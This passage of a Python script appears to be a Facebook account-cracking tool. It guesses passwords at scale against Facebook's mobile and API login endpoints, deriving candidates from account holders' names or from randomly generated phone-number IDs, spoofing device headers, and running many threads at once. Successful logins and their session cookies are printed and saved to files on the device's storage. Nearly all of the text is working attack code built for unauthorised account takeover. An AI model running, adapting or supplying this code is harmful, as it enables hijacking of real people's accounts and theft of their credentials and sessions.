        try:
             ln = names.split(' ')[1]
        except:
             ln = fn
        try:
             for pak in pasx:
                    pas=pak.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                    random_seed=random.Random()
                    adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                    url = f"https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
                    realmemod=(f"SM-{str(random.randrange(2111,4999))}")
                    ua_string = '[FBAN/FB4A;FBAV/'+str(random.randrange(111,950))+'.0.0.'+str(random.randrange(1111,9511))+';FBBV/'+str(random.randrange(1111111,9999999))+';[FBAN/FB4A;FBAV/355.0.0.21.108;FBBV/'+str(random.randrange(111111111,999999999))+';FBDM/{density=3.0,width=1080,height=2153};FBLC/en_BD;FBRV/'+str(random.randrange(111111111,999999999))+';FBCR/ncell;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/'+realmemod+';FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
                    ua_agent = f"[FBAN/Orca-Android;FBAV/"+str(random.randrange(11,99))+".0.0."+str(random.randrange(1111,9999))+";FBBV/"+str(random.randrange(1111111,9999999))+";[FBAN/FB4A;FBAV/74.0.0.4636;FBBV/3230308;[FBAN/FB4A;FBAV/437.0.0.35.116;FBBV/527644733;FBDM/{density=3.0,width=2020,height=1080};FBLC/en_US;FBRV/529308758;FB_FW/2;FBCR/Searching for Service;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
                    data = {"adid": adid,
                     "device_id": str(uuid.uuid4()),
                     "family_device_id": str(uuid.uuid4()),
                     "secure_family_device_id": str(uuid.uuid4()),
                     "advertiser_id": str(uuid.uuid4()),
                     "format": "json",
                     "cpl": "true",
                     "credentials_type": "device_based_login_password",
                     "error_detail_type": "button_with_disabled",
                     "source": "register_api",
                     "email": ids,
                     "password": pas,
                     "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                     "generate_session_cookies": "1",
                     "meta_inf_fbmeta": "NO_FILE",
                     "currently_logged_in_userid": "0",
                     "locale": "en_GB",
                     "client_country_code": "GB",
                     "method": "auth.login",
                     "fb_api_req_friendly_name": "authenticate",
                     "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                     "api_key": "882a8490361da98702bf97a021ddc14d",
                     "sig": "cc331688c9ec07059af4df9dbdcf7737"}
                    head = {"User-Agent": ua_string,
                    "Accept-Encoding": "gzip,deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Host": "b-graph.facebook.com",
                    "Authorization": "OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                    "X-FB-Net-HNI": str(random.randrange(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randrange(20000, 40000)),
                    "X-FB-Client-IP": "True",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-Tigon-Is-Retry": "False",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Connection-Quality": "MOBILE.LTE",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "X-FB-Connection-Bandwidth": str(random.randrange(40000000, 90000000)),
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "795"}
                    po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
                    if 'session_key' in po:
                           uid = str(ids)
                           pwx = str(pas)
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{a}↳{w}[{a}SHISHIR-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/SHISHIR-M1-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/SHISHIR-M1-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
             loop+=1
        except Exception as e:
                 pass
#━━━━━━━━[ MAIN MATHOD NO_2 ]━━━━━━━━#
def firek(ids,names,pasx,tl):
        global loop,oks
        perce = int(loop) / int(tl)*100
        percentage = str(perce).split('.')[0]
        kkkiii=str(len(oks))
        sys.stdout.write(f"\r\r{a}↳{w}[{a}FINDING{w}]\x1b[0m-{w}[\x1b[38;5;39m{loop}{w}]\x1b[0m-{w}[{a}OK:{kkkiii}{w}]\x1b[0m-{w}[\x1b[38;5;39m{percentage}%{w}] ");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
             ln = names.split(' ')[1]
        except:
             ln = fn
        try:
             for pak in pasx:
                    pas=pak.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                    random_seed=random.Random()
                    adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                    url = f"https://api.facebook.com/auth/login"
                    ua_agent = f"[FBAN/Orca-Android;FBAV/"+str(random.randrange(11,99))+".0.0."+str(random.randrange(1111,9999))+";FBBV/"+str(random.randrange(1111111,9999999))+";[FBAN/FB4A;FBAV/74.0.0.4636;FBBV/3230308;[FBAN/FB4A;FBAV/437.0.0.35.116;FBBV/527644733;FBDM/{density=3.0,width=2020,height=1080};FBLC/en_US;FBRV/529308758;FB_FW/2;FBCR/Searching for Service;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
                    data = {
                                 "adid": str(uuid.uuid4()),
                                 "format": "json",
                                 "device_id": str(uuid.uuid4()),
                                 "cpl": "true",
                                 "family_device_id": str(uuid.uuid4()),
                                 "credentials_type": "device_based_login_password",
                                 "error_detail_type": "button_with_disabled",
                                 "source": "device_based_login",
                                 "email": ids,
                                 "password": pas,
                                 "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                                 "generate_session_cookies": "1",
                                 "meta_inf_fbmeta": "",
                                 "advertiser_id": str(uuid.uuid4()),
                                 "currently_logged_in_userid": "0",
                                 "locale": "en_US",
                                 "client_country_code": "US",
                                 "method": "auth.login",
                                 "fb_api_req_friendly_name": "authenticate",
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                                 "api_key": "882a8490361da98702bf97a021ddc14d",
                    }
                    head = {
                                   "User-Agent": ua_agent,
                                   "Accept-Encoding": "gzip, deflate",
                                   "Accept": "*/*",
                                   "Connection": "keep-alive",
                                   "Content-Type": "application/x-www-form-urlencoded",
                                   "Host": "graph.facebook.com",
                                   "X-FB-Net-HNI": str(random.randrange(20000, 40000)),
                                   "X-FB-SIM-HNI": str(random.randrange(20000, 40000)),
                                   "X-FB-Connection-Type": "MOBILE.LTE",
                                   "X-Tigon-Is-Retry": "False",
                                   "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                                   "x-fb-device-group": str(random.randrange(5000, 5900)),
                                   "X-FB-Friendly-Name": "ViewerReactionsMutation",
                                   "X-FB-Request-Analytics-Tags": "graphservice",
                                   "X-FB-HTTP-Engine": "Liger",
                                   "X-FB-Client-IP": "True",
                                   "X-FB-Server-Cluster": "True",
                                   "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
                    }
                    po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
                    if 'session_key' in po:
                           uid = str(ids)
                           pwx = str(pas)
                           coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                           print(f"\r\r{a}↳{w}[{a}SHISHIR-💙{w}] {a}{uid} {I} {pwx}")
                           open("/sdcard/SHISHIR-M2-OK-COOKIE.txt","a").write(uid+'|'+pwx+'|'+str(coki)+'\n')
                           oks.append(uid)
                           break
                    elif 'www.facebook.com' in po['error']['message']:
                            uid = str(ids)
                            pwx = str(pas)
                            open('/sdcard/SHISHIR-M2-CP.txt','a').write(uid+'|'+pwx+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
             loop+=1
        except Exception as e:
                 pass
#━━━━━━━━[ RANDOM ]━━━━━━━━#
def rndxd():
        clear()
        #passlist = [uid[:6],uid[7],uid[8],huf[:6],uid,huf,'203040','bangladesh','@@@####','i love you','sadiya','jannat','jannatul']
        A = f"{h} CODE {I} 017 {w}|{a} 018 {w}|{a} 019 {w}| {a}016\n{g}"
        B = f"{h} ENTER SIM CODE {I2} "
        C = f"{h} LIMIT {I} 1000 {w}|{a} 2500 {w}|{a} 5000\n{g}"
        D = f"{h} ENTER CREAK LIMIT {I2} "
        print(A);CODE = input(B);clear()
        print(C)
        try:
             LIMIT = int(input(D))
        except ValueError:
             LIMIT = 5000
        for number in range(LIMIT):
                nmp = ''.join(random.choice(string.digits) for i in range(7))
                numbr.append(nmp)
        clear()
        print(f"{h1} MATHOD {I} A {w}[{a}MIX ACCOUNT{w}]")
        print(f"{h2} MATHOD {I} B {w}[{a}BEST MATHOD{w}]");linex()
        ho = input(f"{h} ENTER MATHOD {I2} ")
        if ho in ['a','A','1','01']:mtd.append("A")
        elif ho in ['b','B','2','02']:mtd.append("B")
        else:mtd.append("A")
        with terd(max_workers=30) as india:
                clear()
                tl = str(len(numbr))
                W = f"{h} IDS{w}|{a}SIM{w}|{a}MHTD {I} {w}[{a}{tl}{w}|{a}{CODE}{w}|{a}{str(mtd)[2]}{w}]\n"
                X = f"{h} USE APN OR {w}[{a}ON{w}/{a}OFF{w}]{a} AIR MODE \n{g}"
                Y = W +X
                print(Y)
                for huf in numbr:
                        uid = CODE+huf
                        #passlist = [uid[:6],huf[2:8],huf[1:8],uid,huf,'i love you','bangladesh','jannatul','203040','102030','708090','sadiya']
                        passlist = [huf,uid,'khankhan','khan123','khan1122','khan1234','khankhan']
                        if 'A' in mtd:india.submit(idpaslogin,uid,passlist,tl)
                        elif 'B' in mtd:india.submit(idpaslogin2,uid,passlist,tl)
        print(f"\n{g}\n{h} CREAK HAS BEEN COMPLITE \n{g}")
        exit()
#━━━━━━━━[ RAND MTD NO.1 ]━━━━━━━━#
def idpaslogin(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{a}↳{w}[{a}SHISHIR-XD{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
                    session = requests.Session()
                    free_fb = session.get('https://free.facebook.com').text
                    us = usergent()
                    data = {
                           'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'email': uid,
                    'pass': ps,
                    'login': 'Log In'}
                    head = {'User-Agent': us,
                    'method': 'GET',
                    'scheme': 'https',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://www.facebook.com/',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://www.facebook.com',
                    'Alt-Used': 'www.facebook.com',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1'}
                    po = session.post('https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=head,allow_redirects=False,verify=True).text
                    log_cookies=session.cookies.get_dict().keys()
                    if 'c_user' in log_cookies:
                           coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                           uidx=re.findall("c_user=(.*);xs", coki)[0]
                           uid=str(uidx)
                           ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                           res=requests.get(ckk).text
                           if 'Photoshop' in res:
                                 print(f"\r\r{a}↳{w}[{a}SHISHIR-💙{w}] {a}{uid} {I} {ps}")
                                 open("/sdcard/rnd-ok-cookie.txt","a").write(uid+'|'+ps+'|'+coki+'\n')
                                 oks.append(uid)
                                 break
                           else:
                                 break
                    elif 'checkpoint' in log_cookies:
                            print(f"\r\r\033[1;90m ↳[SHISHIR-CP] {uid} ━➤ {ps}")
                            cps.append(uid)
                            break
                    else:
                            continue
            loop+=1
        except Exception as e:
                 pass
#━━━━━━━━[ RAND MTD NO.2]━━━━━━━━#
def idpaslogin2(uid,passlist,tl):
        global loop,oks
        sys.stdout.write(f"\r\r{a}↳{w}[{a}SHISHIR-XD{w}]{a}-{w}[{a}{loop}{w}|{a}{tl}{w}]{a}-{w}[{a}OK:{str(len(oks))}{w}] ");sys.stdout.flush()
        try:
            for ps in passlist:
                    session = requests.Session()
                    free_fb = session.get('https://p.facebook.com').text
                    us = usergent()
                    data = {
                           'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                    'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                    'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                    'try_number': '0',
                    'unrecognized_tries': '0',
                    'email': uid,
                    'pass': ps,
                    'login': 'Log In'}
                    head = {'authority': 'p.facebook.com', 'method': 'GET', 'scheme': 'https', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 'sec-ch-prefers-color-scheme': 'light', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"', 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"CPH2251"', 'sec-ch-ua-platform': '"Android"', 'sec-ch-ua-platform-version': '"13.0.0"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'none', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': us}
                    po = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=data, headers=head,allow_redirects=False,verify=True).text
                    log_cookies=session.cookies.get_dict().keys()
                    if 'c_user' in log_cookies:
                           coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                           uidx=re.findall("c_user=(.*);xs", coki)[0]
                           uid=str(uidx)
                           ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                           res=requests.get(ckk).text
                           if 'Photoshop' in res:
                                 print(f"\r\r{a}↳{w}[{a}SHISHIR-💙{w}] {a}{uid} {I} {ps}")
                                 open("/sdcard/rnd-ok-cookie.txt","a").write(uid+'|'+ps+'|'+coki+'\n')
                                 oks.append(uid)
                                 break
                           else:
                                 break
                    elif 'checkpoint' in log_cookies:
                            print(f"\r\r\033[1;90m ↳[SHISHIR-CP] {uid} ━➤ {ps}")
                            cps.append(uid)
                            break
                    else:
                            continue
            loop+=1
        except Exception as e:
                 pass
 
#━━━━━━━━[ THE END ]━━━━━━━━#
if __name__=='__main__':
         #approval()
         main()
 